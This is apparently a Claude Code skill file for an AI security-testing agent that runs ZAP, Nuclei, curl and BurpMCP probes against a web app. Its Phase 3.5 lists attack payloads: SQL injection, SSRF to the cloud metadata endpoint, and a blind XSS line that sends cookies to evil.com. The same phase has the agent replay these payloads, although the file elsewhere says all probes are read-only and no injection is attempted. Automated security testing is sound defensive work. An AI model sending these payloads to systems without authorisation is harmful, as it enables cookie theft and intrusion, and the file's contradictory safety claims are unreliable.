---
name: qa-security
preamble-tier: 3
version: 1.0.0
description: |
  Security testing skill. Two modes: Mode A (full DAST) drives OWASP ZAP via CLI —
  spider, active scan, Claude OWASP Top 10 / CWE triage. Mode B (lightweight, always
  available) probes security headers, exposed sensitive files, CORS config, and JWT
  weaknesses via curl. Nuclei runs as a second pass when installed. All probes are
  read-only. Use when asked to "security test", "run ZAP", "DAST scan", "check security
  headers", "pentest staging", or "find vulnerabilities". (qa-agentic-team)
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - Glob
  - Grep
  - AskUserQuestion
  - Agent
disable-model-invocation: true
model: sonnet
effort: high
hooks:
  PreToolUse:
    - matcher: "Bash"
      hooks:
        - type: command
          command: 'bash "${CLAUDE_SKILL_DIR}/../bin/hooks/qa-pre-bash-safety.sh"'
  PostToolUse:
    - matcher: "Write|Edit"
      hooks:
        - type: command
          command: 'bash "${CLAUDE_SKILL_DIR}/../bin/hooks/qa-post-write-typecheck.sh"'
          async: true
---

## Version check

!`bash "${CLAUDE_SKILL_DIR}/../bin/qa-version-check-inline.sh" 2>/dev/null || echo "VERSION_STATUS: UPDATE_CHECK_FAILED"`

If `VERSION_STATUS` contains `UPGRADE_AVAILABLE` and `SKIP_UPDATE_ASK` is `0`, use `AskUserQuestion`: "qa-agentic-team update available. Update before running?" Options: "Yes — update now (recommended)" | "No — run with current version". If yes: `git -C "$_QA_ROOT" pull && bash "$_QA_ROOT/bin/setup"`. Continue regardless.

---

## Preamble (run first)

```bash
_TMP="${TEMP:-${TMP:-/tmp}}"
_DATE=$(date +%Y-%m-%d)
_BRANCH=$(git branch --show-current 2>/dev/null || echo "unknown")
echo "BRANCH: $_BRANCH"
echo "DATE: $_DATE"

echo "--- SECURITY TOOL DETECTION ---"
_ZAP=0
command -v zap.sh >/dev/null 2>&1 && _ZAP=1
docker image inspect softwaresecurityproject/zap-stable >/dev/null 2>&1 && _ZAP=1
echo "ZAP_AVAILABLE: $_ZAP"

_NUCLEI=0
command -v nuclei >/dev/null 2>&1 && _NUCLEI=1
echo "NUCLEI_AVAILABLE: $_NUCLEI"

_HTTPX=0
command -v httpx >/dev/null 2>&1 && _HTTPX=1
echo "HTTPX_AVAILABLE: $_HTTPX"

# Detect app stack for Nuclei tag selection
echo "--- STACK DETECTION ---"
_STACK="web"
[ -f package.json ] && _STACK="nodejs"
grep -q '"next"' package.json 2>/dev/null && _STACK="nextjs"
grep -q '"express"' package.json 2>/dev/null && _STACK="express"
[ -f pyproject.toml ] || [ -f requirements.txt ] && _STACK="python"
grep -q 'django' requirements.txt 2>/dev/null && _STACK="django"
grep -q 'fastapi' requirements.txt 2>/dev/null && _STACK="fastapi"
grep -q 'flask' requirements.txt 2>/dev/null && _STACK="flask"
[ -f pom.xml ] && _STACK="java-spring"
[ -f go.mod ] && _STACK="golang"
echo "STACK: $_STACK"

# Base URL
echo "--- BASE URL ---"
_BASE_URL="${QA_BASE_URL:-}"
[ -z "$_BASE_URL" ] && _BASE_URL=$(grep -r "baseURL\|BASE_URL" playwright.config.ts \
  playwright.config.js .env .env.local 2>/dev/null \
  | grep -o 'http[s]*://[^"'"'"' ]*' | head -1)
_BASE_URL="${_BASE_URL:-http://localhost:3000}"
echo "BASE_URL: $_BASE_URL"

# Verify reachability
_APP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$_BASE_URL" --max-time 5 2>/dev/null || echo "000")
echo "APP_STATUS: $_APP_STATUS"

# BurpMCP deep-dive mode detection
echo "--- BURP ---"
_BURP_AVAILABLE=0
find /opt /usr/local ~/tools ~/burpsuite . -name "burpsuite*.jar" \
  ! -path "*/node_modules/*" 2>/dev/null | grep -q '.' && _BURP_AVAILABLE=1
[ "$_BURP_AVAILABLE" = "0" ] && \
  curl -s --max-time 2 http://localhost:1337/burpmcp/health 2>/dev/null | grep -q '.' && \
  _BURP_AVAILABLE=1
echo "BURP_AVAILABLE: $_BURP_AVAILABLE"
```

If `_APP_STATUS` is `000`: warn and use `AskUserQuestion`: "App unreachable at $_BASE_URL. The lightweight probe checks (Mode B) can still run against headers. Proceed?" Options: "Yes — run Mode B probes only" | "Cancel". If proceeding, skip Phase 2 (ZAP) and continue with Mode B + Nuclei.

## Phase 1 — Mode Selection

Determine execution mode from Preamble results:
- `_ZAP=1` → **Mode A** (full ZAP DAST) then Mode B probes, then Nuclei if available
- `_ZAP=0` → **Mode B** (lightweight curl probes) + Nuclei if available

Notify user of mode selected before running.

## Phase 2 — Mode A: ZAP DAST (skip if `_ZAP=0`)

```bash
echo "=== ZAP: SPIDER ==="
# Use Docker if zap.sh not in PATH
if command -v zap.sh >/dev/null 2>&1; then
  zap.sh -cmd -quickurl "$_BASE_URL" -quickout "$_TMP/zap-spider.xml" \
    -silent 2>/dev/null | tail -5 || echo "ZAP_SPIDER: failed"
else
  docker run --rm -v "$_TMP:/zap/results" softwaresecurityproject/zap-stable \
    zap-baseline.py -t "$_BASE_URL" -J /zap/results/zap-alerts.json \
    -m 5 -z "-config scanner.strength=Medium" 2>&1 | tail -20
fi

echo "=== ZAP: ALERTS ==="
# Parse JSON alerts (path may vary by ZAP version)
python3 -c "
import json, os, sys
f = '$_TMP/zap-alerts.json'
if not os.path.exists(f):
  print('ZAP_ALERTS: file not found'); sys.exit(0)
try:
  data = json.load(open(f, encoding='utf-8', errors='replace'))
  alerts = data.get('site', [{}])[0].get('alerts', []) if isinstance(data.get('site'), list) else \
           data.get('alerts', []) if isinstance(data, dict) else []
  counts = {'High':0,'Medium':0,'Low':0,'Informational':0}
  for a in alerts:
    risk = a.get('riskdesc', 'Informational').split(' ')[0]
    counts[risk] = counts.get(risk, 0) + 1
    if risk in ('High','Medium'):
      print(f'ZAP_ALERT: [{risk}] {a.get(\"alert\",\"\")} | CWE: {a.get(\"cweid\",\"\")} | {a.get(\"url\",\"\")}')
  for k,v in counts.items():
    print(f'ZAP_{k.upper()}: {v}')
except Exception as e:
  print(f'ZAP_PARSE_ERROR: {e}')
" 2>/dev/null
```

Claude triage: for each `High`/`Medium` alert, map to OWASP Top 10 category (A01–A10) and estimate CVSS score range.

## Phase 2b — Mode B: Lightweight Security Probes (always runs)

```bash
echo "=== SECURITY HEADER PROBES ==="
_HEADERS=$(curl -sI "$_BASE_URL" --max-time 10 2>/dev/null)
echo "--- Raw security-relevant headers ---"
echo "$_HEADERS" | grep -iE "x-frame-options|content-security-policy|x-content-type-options|strict-transport-security|x-xss-protection|permissions-policy|referrer-policy|cross-origin" || true
echo "--- Missing headers check ---"
for h in "content-security-policy" "x-frame-options" "x-content-type-options" \
         "strict-transport-security" "permissions-policy" "referrer-policy"; do
  echo "$_HEADERS" | grep -qi "$h" || echo "MISSING_HEADER: $h"
done

echo "=== EXPOSED SENSITIVE FILES ==="
for path in ".env" ".env.local" ".env.production" ".git/config" ".git/HEAD" \
            "config/database.yml" "config/secrets.yml" ".DS_Store" \
            "phpinfo.php" "wp-config.php" "admin/" "api/health" "actuator/env" \
            "server-status" ".htaccess" "web.config"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "$_BASE_URL/$path" --max-time 5 2>/dev/null || echo "000")
  [ "$status" = "200" ] && echo "EXPOSED: /$path (HTTP $status)"
done

echo "=== CORS CHECK ==="
_CORS=$(curl -sI -H "Origin: https://evil.example.com" -H "Access-Control-Request-Method: GET" \
  "$_BASE_URL/api/" --max-time 5 2>/dev/null | grep -i "access-control-allow-origin" || true)
[ -n "$_CORS" ] && echo "CORS_RESPONSE: $_CORS" || echo "CORS_RESPONSE: header not present"
echo "$_CORS" | grep -q "evil.example.com\|\*" && echo "CORS_ISSUE: allows arbitrary origins"

echo "=== JWT / AUTH CHECK ==="
_UNAUTH=$(curl -s -o /dev/null -w "%{http_code}" "$_BASE_URL/api/users" --max-time 5 2>/dev/null || echo "000")
_BADTOKEN=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer invalid_token_test" \
  "$_BASE_URL/api/users" --max-time 5 2>/dev/null || echo "000")
echo "UNAUTH_API_STATUS: $_UNAUTH  BAD_TOKEN_STATUS: $_BADTOKEN"
[ "$_UNAUTH" = "200" ] && echo "AUTH_ISSUE: /api/users returns 200 without authentication"
[ "$_BADTOKEN" = "200" ] && echo "AUTH_ISSUE: /api/users returns 200 with invalid token"

echo "=== CLICKJACKING CHECK ==="
echo "$_HEADERS" | grep -qi "x-frame-options\|frame-ancestors" || \
  echo "CLICKJACKING_RISK: no X-Frame-Options or CSP frame-ancestors"

echo "=== HTTP METHOD PROBE ==="
_TRACE=$(curl -s -o /dev/null -w "%{http_code}" -X TRACE "$_BASE_URL" --max-time 5 2>/dev/null || echo "000")
[ "$_TRACE" = "200" ] && echo "TRACE_ENABLED: TRACE method allowed (XST risk)"
_OPTIONS=$(curl -sI -X OPTIONS "$_BASE_URL" --max-time 5 2>/dev/null | grep -i "allow:" || true)
echo "ALLOWED_METHODS: ${_OPTIONS:-unknown}"
```

## Phase 3 — Nuclei (skip if `_NUCLEI=0`)

```bash
echo "=== NUCLEI SCAN ==="
nuclei -u "$_BASE_URL" \
  -tags "${_STACK},owasp,cve,misconfig,exposure,token" \
  -severity high,medium \
  -rate-limit 10 \
  -timeout 5 \
  -j -o "$_TMP/nuclei-results.json" 2>&1 | tail -20 || echo "NUCLEI_EXIT: $?"

# Parse nuclei JSON output
python3 -c "
import json, os, sys
f = '$_TMP/nuclei-results.json'
if not os.path.exists(f) or os.path.getsize(f) == 0:
  print('NUCLEI_RESULTS: none'); sys.exit(0)
# nuclei outputs one JSON object per line
lines = open(f, encoding='utf-8', errors='replace').readlines()
high=0; medium=0
for line in lines:
  try:
    r = json.loads(line.strip())
    sev = r.get('info',{}).get('severity','')
    name = r.get('info',{}).get('name','')
    url = r.get('host','')
    if sev == 'high': high+=1; print(f'NUCLEI_HIGH: {name} | {url}')
    elif sev == 'medium': medium+=1; print(f'NUCLEI_MEDIUM: {name} | {url}')
  except: pass
print(f'NUCLEI_SUMMARY: high={high} medium={medium}')
" 2>/dev/null
```

## Phase 3.5 — BurpMCP Authenticated Session Security Testing (BL-021)

Skip if `_BURP_AVAILABLE=0` or `QA_SKIP_BURP=1`.

This phase operates in **deep-dive mode**: it uses Burp Suite's captured HTTP traffic
to test authenticated endpoints that ZAP and curl probes cannot reach without session tokens.

**Step 1 — Retrieve captured requests from Burp:**

Use the BurpMCP MCP tool calls to retrieve HTTP requests captured during a manual session or
a previous automated run:

```
burp_retrieve_requests(scope: "_BASE_URL", limit: 50)
```

If BurpMCP MCP tools are not available (MCP server not configured), fall back to reading
Burp's exported XML file if `QA_BURP_EXPORT` env var points to one:

```bash
[ -n "$QA_BURP_EXPORT" ] && echo "BURP_EXPORT: $QA_BURP_EXPORT" && \
  grep -c "<item>" "$QA_BURP_EXPORT" 2>/dev/null | xargs echo "BURP_REQUESTS:"
```

**Step 2 — Claude injection point analysis:**

For each captured request (up to 20), Claude analyzes:
- URL parameters, form fields, JSON body fields, headers → mark as injection candidates
- Auth headers present → note that authenticated testing is possible
- Prioritize: POST/PUT/PATCH bodies over GET params; API endpoints over static assets

Produce an injection target list:
```
INJECTION_TARGET: POST /api/users  body.role (privilege escalation candidate)
INJECTION_TARGET: GET /api/items?id=123  param.id (IDOR candidate)
INJECTION_TARGET: POST /api/login  body.username (SQLi candidate)
```

**Step 3 — Craft and replay payloads:**

For each injection target (up to 10), craft a test payload and replay using BurpMCP:

```
burp_send_request(request: <modified_request_with_payload>)
```

Or via curl if BurpMCP replay is unavailable:

```bash
# Example: IDOR probe — replace numeric ID with another user's ID
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer $_AUTH_TOKEN" \
  "$_BASE_URL/api/items/1" --max-time 10 2>/dev/null
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer $_AUTH_TOKEN" \
  "$_BASE_URL/api/items/2" --max-time 10 2>/dev/null
```

**Payload classes tested:**

| Class | Example payload | Finding if app accepts |
|-------|----------------|------------------------|
| BOLA/IDOR | Replace `userId` with another valid ID | Unauthorized data access |
| Privilege escalation | Set `role: "admin"` in POST body | Mass assignment vulnerability |
| SQL injection | `' OR '1'='1` in string fields | Potential SQLi |
| Blind XSS | `<script>fetch('http://evil.com?c='+document.cookie)</script>` | Stored XSS candidate |
| SSRF | `url: "http://169.254.169.254/latest/meta-data/"` | SSRF in URL fields |

**Step 4 — Out-of-band detection (if `QA_BURP_COLLABORATOR` is set):**

If a Burp Collaborator URL is configured, use it as the exfil target for blind SSRF/XXE probes:

```bash
if [ -n "$QA_BURP_COLLABORATOR" ]; then
  echo "COLLABORATOR_URL: $QA_BURP_COLLABORATOR"
  echo "OUT_OF_BAND: enabled — blind SSRF/XXE probes will use collaborator callback"
fi
```

**Step 5 — Report findings:**

For each test, record:
- `ATTACK_REJECTED` → expected; counts as pass
- `ATTACK_SUCCEEDED` (2xx response accepting malicious payload) → **security finding**
- Unexpected 5xx → potential error-disclosure finding

Add **BurpMCP** section to Phase 5 report:
```
## BurpMCP Deep-Dive Results (Phase 3.5)
- Requests analyzed: N  Injection targets identified: N  Payloads replayed: N
- ATTACK_REJECTED: N  ATTACK_SUCCEEDED: N  Error disclosure: N
- Auth-path coverage: <list of authenticated endpoints tested>

| Endpoint | Payload class | Result | Severity |
|----------|--------------|--------|----------|
```

**Safety:** All probes carry the existing session token from captured traffic. No brute-force,
no credential scanning. Use only against staging/dev environments where you have authorization.

## Phase 4 — CTRF Output

```python
python3 - << 'PYEOF'
import json, os, re, time

tmp = os.environ.get('TEMP') or os.environ.get('TMP') or '/tmp'

# Count findings from all phases
findings = []
# Check for ZAP alerts
zap_file = os.path.join(tmp, 'zap-alerts.json')
if os.path.exists(zap_file):
    try:
        data = json.load(open(zap_file, encoding='utf-8', errors='replace'))
        alerts = data.get('site', [{}])[0].get('alerts', []) if isinstance(data.get('site'), list) else data.get('alerts', [])
        for a in alerts:
            risk = a.get('riskdesc', 'Informational').split(' ')[0]
            findings.append({'name': f'ZAP: {a.get("alert","")}', 'status': 'failed' if risk in ('High','Medium') else 'passed', 'duration': 0, 'suite': 'security'})
    except: pass

now_ms = int(time.time() * 1000)
passed = sum(1 for f in findings if f['status'] == 'passed')
failed = sum(1 for f in findings if f['status'] == 'failed')

ctrf = {
    'results': {
        'tool': {'name': 'qa-security'},
        'summary': {'tests': max(len(findings), 1), 'passed': passed, 'failed': failed,
                    'pending': 0, 'skipped': 0, 'other': 0,
                    'start': now_ms - 10000, 'stop': now_ms},
        'tests': findings if findings else [{'name': 'security-probe', 'status': 'passed', 'duration': 0, 'suite': 'security'}],
        'environment': {'reportName': 'qa-security', 'branch': os.environ.get('_BRANCH', 'unknown')}
    }
}
out = os.path.join(tmp, 'qa-security-ctrf.json')
json.dump(ctrf, open(out, 'w', encoding='utf-8'), indent=2)
print(f'CTRF_WRITTEN: {out}')
PYEOF
```

## Phase 5 — Report

Write `$_TMP/qa-security-report.md`:

```markdown
# QA Security Report — <date>

## Executive Summary
- **Mode**: Mode A (ZAP) / Mode B (probes only)
- **Risk**: 🔴 Critical: N | 🟠 High: N | 🟡 Medium: N | 🟢 Low: N | ℹ️ Info: N
- **Nuclei**: N high / N medium findings

## Findings

| Finding | OWASP | CWE | Risk | URL | Remediation |
|---------|-------|-----|------|-----|-------------|
| Missing CSP header | A05 | CWE-693 | Medium | / | Add Content-Security-Policy header |
| Exposed .env | A02 | CWE-200 | High | /.env | Block in server config |

## Missing Security Headers
| Header | Recommended Value |
|--------|-------------------|
| Content-Security-Policy | `default-src 'self'; ...` |
| X-Frame-Options | `SAMEORIGIN` |
| X-Content-Type-Options | `nosniff` |
| Strict-Transport-Security | `max-age=31536000; includeSubDomains` |
| Permissions-Policy | `geolocation=(), camera=()` |

## Exposed Sensitive Files
<list with remediation — add to .gitignore / deny in web server config>

## Authentication / Authorization Issues
<JWT/auth probe results>

## Next Steps
<prioritized remediation list>

---
*All probes were read-only. No POST fuzzing or auth bypass attempts were made.*
```

## Important Rules

- **Read-only probes only** — never POST malicious payloads, attempt SQL injection, or exploit vulnerabilities
- **Staging environments only** — do not run against production without explicit confirmation
- **Rate limiting** — probe at most 10 req/s; never flood with concurrent requests
- **False positive awareness** — ZAP alerts require human confirmation before treating as confirmed vulnerabilities

## Agent Memory

After each run, update `.claude/agent-memory/qa-security/MEMORY.md` (create if absent). Record:
- App stack and detected framework
- Known false positives (e.g., intentionally exposed /api/health)
- Headers already present vs. missing baseline
- Mode used (A vs. B) and tool versions

## Telemetry (run last)

```bash
~/.claude/skills/gstack/bin/gstack-timeline-log \
  '{"skill":"qa-security","event":"completed","branch":"'"$_BRANCH"'","date":"'"$_DATE"'"}' \
  2>/dev/null || true
```
